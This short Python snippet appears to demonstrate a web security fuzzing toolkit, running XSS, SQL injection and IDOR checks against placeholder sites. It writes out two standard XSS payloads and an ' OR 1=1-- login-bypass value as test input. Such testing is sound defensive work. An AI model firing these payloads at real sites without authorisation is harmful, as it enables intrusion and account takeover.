from src.fuzzing import xss_fuzzer, sqli_fuzzer, idor_checker

# XSS fuzzing
payloads = ["<script>alert(1)</script>", "<img src=x onerror=alert(1)>"]
xss_fuzzer.run("http://testsite.com/search", payloads)

# SQL injection fuzzing
sqli_fuzzer.test("http://testsite.com/login", {"user": "admin", "pass": "' OR 1=1--"})

# IDOR check
targets = ["http://example.com/user/1", "http://example.com/user/2"]
idor_checker.test(targets)